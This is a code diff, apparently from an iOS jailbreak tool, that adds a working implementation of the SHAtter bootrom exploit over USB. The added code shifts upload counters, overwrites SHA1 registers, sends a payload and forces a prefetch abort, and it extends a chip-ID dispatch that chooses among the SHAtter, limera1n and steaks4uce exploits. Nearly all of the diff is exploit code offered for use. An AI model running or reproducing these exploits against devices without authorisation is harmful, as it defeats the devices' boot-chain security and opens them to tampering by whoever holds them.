@@ -6,8 +6,8 @@
 #include "libpartial.h"
 #include "libirecovery.h"
 
-//#include "exploit.h"
 #include "ramdisk.h"
+#include "shatter.h"
 #include "limera1n.h"
 #include "steaks4uce.h"
 #include "payloads/iBSS.k66ap.h"
@@ -464,6 +464,106 @@ int limera1n_exploit() {
 	return 0;
 }
 
+int shatter_exploit() {
+	irecv_error_t error = 0;
+
+	debug("Resetting device counters\n");
+	error = irecv_reset_counters(client);
+	if (error != IRECV_E_SUCCESS) {
+		error("%s\n", irecv_strerror(error));
+		return -1;
+	}
+
+	debug("Shifting upload pointer\n");
+	if(receive_data(0x80)) {
+		error("Unable to shift upload counter\n");
+		return -1;
+	}
+
+	debug("Resetting device\n");
+	irecv_reset(client);
+
+	debug("Finishing shift transaction\n");
+	error = irecv_finish_transfer(client);
+	if (error != IRECV_E_SUCCESS) {
+		error("%s\n", irecv_strerror(error));
+		return -1;
+	}
+
+	debug("Reconnecting to device\n");
+	client = irecv_reconnect(client, 2);
+	if (client == NULL) {
+		error("Unable to reconnect to device\n");
+		return -1;
+	}
+
+	debug("Overwriting SHA1 registers\n");
+	if(receive_data(0x2C000)) {
+		error("Unable to overwrite SHA1 registers\n");
+		return -1;
+	}
+
+	debug("Reconnecting to device\n");
+	client = irecv_reconnect(client, 2);
+	if (client == NULL) {
+		error("Unable to reconnect to device\n");
+		return -1;
+	}
+
+	debug("Resetting device counters\n");
+	error = irecv_reset_counters(client);
+	if (error != IRECV_E_SUCCESS) {
+		error("%s\n", irecv_strerror(error));
+		return -1;
+	}
+
+	debug("Shifting upload pointer\n");
+	if(receive_data(0x140)) {
+		error("Unable to shift upload counter\n");
+		return -1;
+	}
+
+	debug("Resetting device\n");
+	irecv_reset(client);
+
+	debug("Finishing shift transaction\n");
+	error = irecv_finish_transfer(client);
+	if (error != IRECV_E_SUCCESS) {
+		error("%s\n", irecv_strerror(error));
+		return -1;
+	}
+
+	debug("Reconnecting to device\n");
+	client = irecv_reconnect(client, 2);
+	if (client == NULL) {
+		error("Unable to reconnect to device\n");
+		return -1;
+	}
+
+	debug("Sending exploit data\n");
+	error = irecv_send_buffer(client, (unsigned char*) shatter, sizeof(shatter), 0);
+	if(error != IRECV_E_SUCCESS) {
+		error("Unable to send exploit data\n");
+		return -1;
+	}
+
+	debug("Forcing prefetch abort exception\n");
+	if(receive_data(0x2C000)) {
+		error("Unable to force prefetch abort exception\n");
+		return -1;
+	}
+
+	debug("Reconnecting to device\n");
+	client = irecv_reconnect(client, 2);
+	if (client == NULL) {
+		debug("%s\n", irecv_strerror(error));
+		error("Unable to reconnect\n");
+		return -1;
+	}
+
+	return 0;
+}
+
 int upload_ibss() {
 	if(upload_dfu_image("iBSS") < 0) {
 		error("Unable upload iBSS\n");
@@ -840,18 +940,35 @@ void pois0n_exit() {
 int pois0n_inject() {
 	//////////////////////////////////////
 	// Send exploit
-	if(device->chip_id == 8720) {
-		debug("Preparing to upload steaks4uce exploit\n");
-		if(steaks4uce_exploit() < 0) {
+	if(device->chip_id == 8930){
+		debug("Preparing to upload SHAtter exploit\n");
+		if(shatter_exploit() < 0) {
 			error("Unable to upload exploit data\n");
 			return -1;
 		}
-	} else {
+	}
+	else if(device->chip_id == 8920 || device->chip_id == 8922) {
+#ifndef __APPLE__
 		debug("Preparing to upload limera1n exploit\n");
 		if(limera1n_exploit() < 0) {
 			error("Unable to upload exploit data\n");
 			return -1;
 		}
+#else
+		error("Sorry, the limera1n exploit is not support on MacOSX yet\n");
+		return -1;
+#endif
+	}
+	else if(device->chip_id == 8720) {
+		debug("Preparing to upload steaks4uce exploit\n");
+		if(steaks4uce_exploit() < 0) {
+			error("Unable to upload exploit data\n");
+			return -1;
+		}
+	}
+	else {
+		error("Sorry, this device is not currently supported\n");
+		return -1;
 	}
 
 	//////////////////////////////////////
@@ -863,7 +980,7 @@ int pois0n_inject() {
 	}
 
 	debug("Reconnecting to device\n");
-	client = irecv_reconnect(client, 10);
+	client = irecv_reconnect(client, 5);
 	if (client == NULL) {
 		error("Unable to reconnect\n");
 		return -1;
